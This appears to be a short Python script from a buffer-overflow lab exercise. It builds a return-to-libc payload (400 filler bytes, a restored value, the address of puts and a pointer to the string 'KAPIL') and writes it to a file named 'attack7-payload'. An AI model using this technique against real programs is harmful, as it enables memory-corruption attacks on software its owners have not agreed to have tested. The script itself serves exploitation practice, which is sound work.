import struct

# Address of the puts function
puts_address = 0x56556090
# Packing the puts function address
puts_address_packed = struct.pack('<I',puts_address)

# Address of my name in memory
kapil_address = 0xffffd4e8
# Packing the address of my name
kapil_address_packed = struct.pack('<I',kapil_address)

val = 0x56558fa4
val_packed = struct.pack('<I',val)

#----------------------------
# Creating the payload
#----------------------------
payload = b'A'* 400
payload += val_packed
payload += b'A'*4
# Adding the puts address to the payload
payload += puts_address_packed
payload += b'A'*4
# Adding my name's address to the payload
payload += kapil_address_packed
payload += b'KAPIL'

# Write into the attack7-payload file
with open("attack7-payload", "wb") as f:
    f.write(payload)
